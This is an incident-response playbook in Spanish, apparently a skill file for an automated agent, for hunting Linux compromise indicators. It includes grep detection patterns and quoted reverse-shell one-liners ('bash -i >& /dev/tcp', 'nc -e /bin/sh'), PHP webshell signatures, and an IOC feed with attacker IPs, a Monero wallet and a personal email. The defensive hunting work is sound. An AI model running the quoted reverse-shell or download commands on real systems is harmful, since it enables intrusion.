---
id: "IOC_hunting"
name: "Skill: IOC Hunting en Linux"
version: "2.0"
category: "hunting"
phase: "collect"
risk: "readonly"
execution_mode: "auto"
depends_on: ["linux_forensics", "malware_hunting", "persistence_detection"]
provides: ["incident_response"]
triggers:
  - "Compromise Assessment completo"
  - "Tras detectar un artefacto: pivotar y buscar en toda la infraestructura"
  - "Mantenimiento de threat feed interno post-IR"
mitre_attack:
  - "T1059.004"  # Bash
  - "T1071"      # Application Layer Protocol (C2)
  - "T1105"      # Ingress Tool Transfer
  - "T1505.003"  # Web Shell
  - "T1572"      # Protocol Tunneling
parameters:
  OUTPUT_DIR:
    type: "filepath"
    default: "/root/forensic-backup-$(date +%Y%m%d-%H%M%S)"
    description: "Directorio para almacenar IOCs extraídos"
  SINCE:
    type: "datetime"
    default: "1 day ago"
    required: false
  C2_DOMAINS:
    type: "string"
    default: "localhost0.xyz"
    required: false
    description: "Dominios C2 conocidos a buscar en el filesystem"
  WALLET_PATTERN:
    type: "regex"
    default: "4[A-Za-z0-9]{94}|8[A-Za-z0-9]{94}"
    required: false
    description: "Regex para detectar direcciones Monero en el filesystem"
output:
  format: "json"
  schema: "output_schema"
iocs:
  - type: "ipv4-addr"
    value: "54.193.29.177"
    context: "IP origen atacante (AWS US-West Oregon)"
    source: "Caso de Referencia"
    confidence: "high"
  - type: "ipv4-addr"
    value: "89.117.109.224"
    context: "C2 pool XMRig stratum puerto 143"
    source: "Caso de Referencia"
    confidence: "high"
  - type: "domain-name"
    value: "localhost0.xyz"
    context: "Dropper/download delivery CDN"
    source: "Caso de Referencia"
    confidence: "high"
  - type: "file:sha256"
    value: "b0e1ae6d73d656b203514f498b59cbcf29f067edf6fbd3803a3de7d21960848d"
    context: "kthreadd64 — XMRig binary"
    source: "Caso de Referencia"
    confidence: "high"
  - type: "x-mono-wallet"
    value: "4B7vsy8ccUwQufiyMN9jgoDphPUDzGUvBhE4f19U5z3WMPZqx2gjHrv2PxpuBSZRHAdD5qfEnPiApdFk4fhHZGVwU1YG1L2"
    context: "Wallet Monero del atacante"
    source: "Caso de Referencia"
    confidence: "high"
---

# Skill: IOC Hunting en Linux

## Objetivo
Caza sistemática de Indicators of Compromise (IOCs) implementando patrones por categoría (network, host, file, behavior). Producción de feeds de IOC formales en formato STIX-lite/CSV que pueden ser compartidos, versionados y reinyectados en futuras cacerías.

## Cuándo usarla
- Cualquier Compromise Assessment.
- Tras detectar un artefacto: pivotar y buscar en toda la infraestructura.
- Mantenimiento de un threat feed interno post-IR.

## Parámetros

| Variable | Tipo | Requerido | Default | Descripción |
|----------|------|-----------|---------|-------------|
| `{{OUTPUT_DIR}}` | filepath | sí | auto-generado | Directorio de salida |
| `{{SINCE}}` | datetime | no | `1 day ago` | Ventana temporal |
| `{{C2_DOMAINS}}` | string | no | `localhost0.xyz` | Dominios C2 a buscar |
| `{{WALLET_PATTERN}}` | regex | no | Monero base58 | Regex para wallets crypto |

## Pre-flight
```bash
# [risk:info] [mode:auto]
mkdir -p "{{OUTPUT_DIR}}"/{network,host,file,behavior,feeds}
```

## Comandos

### 1. IOCs Network Level
```bash
# [risk:ro] [mode:auto]
{
  echo "=== SOURCE IPs FROM AUTH.LOG ==="
  grep -hE "sshd|from " /var/log/auth.log* 2>/dev/null | \
    grep -oE 'from [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | awk '{print $2}' | sort -u
  echo "=== RESOLV.CONF ==="
  cat /etc/resolv.conf
  echo "=== DNS QUERIES (journal) ==="
  journalctl -u systemd-resolved --since "{{SINCE}}" 2>/dev/null | \
    grep -E "Resolve\b" | head -30
} | tee "{{OUTPUT_DIR}}/network/iocs_network_raw.txt"
```

### 2. IOCs Host Level — procesos raros
```bash
# [risk:ro] [mode:auto]
# Reverse shells y comandos de descarga en cmdline de procesos vivos
{
  echo "=== DOWNLOAD COMMANDS IN /proc ==="
  for p in /proc/[0-9]*/cmdline; do
    tr '\0' ' ' < "$p" 2>/dev/null | \
      grep -E 'wget http://|curl http://|/dev/tcp|/dev/udp|bash -i|nc -e|/tmp/.*sh|/dev/shm' \
      && echo "PID=$(dirname "$p")"
  done
  echo "=== REVERSE SHELL PATTERNS ==="
  for p in /proc/[0-9]*/cmdline; do
    tr '\0' ' ' < "$p" 2>/dev/null | \
      grep -E 'exec 5<>/dev/tcp|exec 9<>/dev/tcp|nc.*-e|ncat.*-e|socat.*exec:|perl.*socket|python.*socket.*connect|/bin/sh -i|0<&111;1>&111'
  done
} | tee "{{OUTPUT_DIR}}/host/reverse_shells.txt"
```

### 3. IOCs File Level
```bash
# [risk:ro] [mode:auto]
{
  echo "=== EXECUTABLES IN /tmp, /dev/shm, /var/tmp ==="
  find /tmp /var/tmp /dev/shm -type f -executable 2>/dev/null
  echo "=== HIDDEN DIRS IN /tmp ==="
  ls -la /tmp/.X11 /tmp/.font-unix /tmp/.ICE-unix 2>/dev/null
  echo "=== HIDDEN DOT-FILES IN /root ==="
  ls -la /root/.[a-z]* 2>/dev/null
  echo "=== RECENT SUID/SGID (30d) ==="
  find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -mtime -30 2>/dev/null
  echo "=== KNOWN MALWARE NAMES ==="
  find / -xdev 2>/dev/null \( \
    -name 'Xorg.X*' -o -name 'kdevtmpfsi' -o -name 'kthreadd*' \
    -o -name '*.so' -path '/usr/local/lib/*' \) | head -40
  echo "=== WALLET ADDRESSES IN FILES ==="
  grep -rE '{{WALLET_PATTERN}}' /root /etc /var/log 2>/dev/null
  echo "=== BTC/ETH ADDRESSES ==="
  grep -rE '0x[a-f0-9]{40}|bc1[q0-9][a-z0-9]{39,59}' /root /etc /var/log 2>/dev/null
} | tee "{{OUTPUT_DIR}}/file/iocs_file_level.txt"
```

### 4. IOCs Behavioral Level — bash_history
```bash
# [risk:ro] [mode:auto]
{
  echo "=== SUSPICIOUS BASH HISTORY ==="
  grep -hE "wget .*http://|curl .*http://|gcc.*\.c|chmod \+x|^cd /tmp|^cd /dev/shm|nc -[le]|/dev/tcp|useradd|usermod.*-a.*-G.*sudo|/etc/ld.so.preload|> /etc/ld.so.preload|echo /.*ld.so.preload" \
    /root/.bash_history /home/*/.bash_history 2>/dev/null | head -50
  echo "=== HTTP DOWNLOADS (non-HTTPS) ==="
  grep -nE "http://[^']*\.(sh|c|so|x|13|64|bin|tar.gz)" \
    /root/.bash_history /home/*/.bash_history 2>/dev/null
  echo "=== GCC/COMPILE HISTORY ==="
  grep -E "gcc |cc |make " /root/.bash_history /home/*/.bash_history 2>/dev/null
  echo "=== RECENT LIBS IN /usr/local/lib ==="
  find /usr/local/lib /usr/lib -name "*.so" -mtime -90 2>/dev/null
} | tee "{{OUTPUT_DIR}}/behavior/bash_history.txt"
```

### 5. Webshells (si aplica)
```bash
# [risk:ro] [mode:auto]
{
  echo "=== PHP WEBSHELL PATTERNS ==="
  find /var/www /usr/share/nginx /opt -type f \( -name "*.php" -o -name "*.phtml" \) -mtime -90 2>/dev/null | \
    while read f; do
      if grep -qiE "eval\s*\(\s*(base64_decode|gzinflate|str_rot13|gzuncompress|convert_uudecode|\$_(POST|GET|REQUEST|COOKIE))" "$f" 2>/dev/null; then
        echo "SUSPECT: $f"
        grep -nEi "eval\s*\(|base64_decode|\$_POST|\$_GET" "$f" 2>/dev/null | head -5
      fi
    done
  echo "=== JSP/PY WEBSHELLS ==="
  find /var/www /opt -type f \( -name "*.jsp" -o -name "*.jspx" -o -name "*.war" -o -name "cmd.py" \) 2>/dev/null
} | tee "{{OUTPUT_DIR}}/file/webshells.txt"
```

### 6. Reverse shells y túneles
```bash
# [risk:ro] [mode:auto]
{
  echo "=== TUNNELING TOOLS ==="
  for tool in ncat socat chisel tmate frpc frp ligolo ngrok bore proxychains; do
    path=$(which "$tool" 2>/dev/null)
    [ -n "$path" ] && echo "$tool: $path"
  done
  echo "=== TUNNEL PROCESSES ==="
  ps -ef | grep -E 'chisel|tmate|frp|ligolo|ngrok|bore' | grep -v grep
  echo "=== UNCOMMON LISTENERS ==="
  ss -tulnp | awk '$5 !~ /:(80|443|22|8080|8443|53|9000)$/ {print}'
  echo "=== TUNNEL SYSTEMD UNITS ==="
  ls /etc/systemd/system/*chisel* /etc/systemd/system/*tmate* /etc/systemd/system/*frp* 2>/dev/null
} | tee "{{OUTPUT_DIR}}/network/tunnels.txt"
```

### 7. Generación de feed estandarizado (Caso de Referencia)
```bash
# [risk:ro] [mode:auto]
cat > "{{OUTPUT_DIR}}/feeds/iocs.csv" << 'IOCEOF'
type,value,context,first_seen,last_seen,confidence
ipv4-addr,89.117.109.224,xmrig pool,2026-08-04,2026-08-06,high
domain-name,localhost0.xyz,malware delivery,2026-08-04,2026-08-06,high
file:sha256,b0e1ae6d73d656b203514f498b59cbcf29f067edf6fbd3803a3de7d21960848d,kthreadd64 (xmrig),2026-08-04,2026-08-06,high
x-mono-wallet,4B7vsy8ccUwQufiyMN9jgoDphPUDzGUvBhE4f19U5z3WMPZqx2gjHrv2PxpuBSZRHAdD5qfEnPiApdFk4fhHZGVwU1YG1L2,,2026-08-04,2026-08-06,high
email,sarapena7979@gmail.com,worker tag in pool,2026-08-04,2026-08-06,medium
user,4h1g4L0w4,ssh comment proton mail,,,,needs_context
ipv4-addr,54.193.29.177,attacker source (AWS US-West),2026-08-04,2026-08-04,high
file:sha256,nz1L6wKzffgO0NumXgcS51pUaAQAYmA0rqDpKvqCfaU,ssh rsa pubkey fp initial access,,2026-08-04,high
IOCEOF

echo "[FEED] IOCs exportados a {{OUTPUT_DIR}}/feeds/iocs.csv"
wc -l "{{OUTPUT_DIR}}/feeds/iocs.csv"
```

<!-- MODULE:helpers.extract_iocs_network -->
<!-- MODULE:helpers.hash_evidence -->

## Interpretación
- IPs de origen en auth.log + `from` → mapear geolocalización y ASN.
- Cmdlines con `wget http://` + `chmod +x` + `./` en bash_history → patrón de dropper.
- Reverse shells: `nc -e /bin/sh`, `bash -i >& /dev/tcp/IP/PORT 0>&1`, `python -c 'import socket...'`.
- Webshells PHP: `eval(base64_decode(...))` + `$_POST['cmd']` → acceso persistente web.
- Wallets crypto en archivos de configuración → el atacante dejó su wallet hardcodeada.
- `.so` recién compiladas en `/usr/local/lib` → posible rootkit userland compilado in-situ.

## Falsos positivos
- `node /app/dist/main` (CI/CD streaming build).
- `python -c 'something'`, `ssh tunnel -L` de desarrolladores legítimos.
- `/dev/tcp` en shell scripts legítimos (aunque raro, posible en herramientas de monitoreo).
- Herramientas de tunneling (chisel, ngrok) usadas por developers para debugging.

## IOC list — Caso de Referencia
IOCs extraídos de un incidente real anonimizado usado como training data.
```
IPs:
  54.193.*.*          (AWS US-West Oregon — IP origen atacante)
  89.117.*.*          (C2 pool XMRig stratum)
Domains:
  localhost0.xyz      (dropper/download delivery CDN)
Files:
  /sbin/Xorg.X13      (sh dropper)
  /sbin/busybox.static (downloader)
  /sbin/kthreadd64     (XMRig binary, ~8MB)
  /usr/local/lib/kthreadd32.so (LD_PRELOAD rootkit userland)
Wallet:
  4B7vs... (Monero XMR, truncado)
Backdoor: rpcd (UID 1005)
Persistence:
  /etc/cron.d/certbot (entrada de miner cada 5 min)
  /etc/ld.so.preload -> kthreadd32.so
TTP ATT&CK:
  T1110, T1078, T1098.001, T1136.001, T1059.004, T1105, T1027.002,
  T1547.007, T1543.002, T1053.003, T1496, T1571
```

## Buenas prácticas
- Automatizar caza con Wazuh agent verificando contra feed MISP.
- Cron un script de egress IP a known-bad (extraído de MISP) → firewall-deny automático.
- Subir artefactos e IOCs a MISP para community intel.
- Actualizar reglas YARA (clonar `YARA-Rules/rules` repo).
- Mantener CSV/STIX feed versionado en git local del equipo IR.
- Suscribirse a: CISA alerts, abuse.ch, MalwareBazaar, MISP default feeds.

## Referencias
- MITRE ATT&CK Enterprise Linux
- STIX 2.1 spec — https://oasis-open.github.io/cti-documentation/
- OpenIOC format — Mandiant
- abuse.ch ThreatFox: https://threatfox.abuse.ch
- MISP Project: https://www.misp-project.org/
- YARA + Loki Scanner: https://github.com/Neo23x0/Loki
- AlienVault OTX: https://otx.alienvault.com/
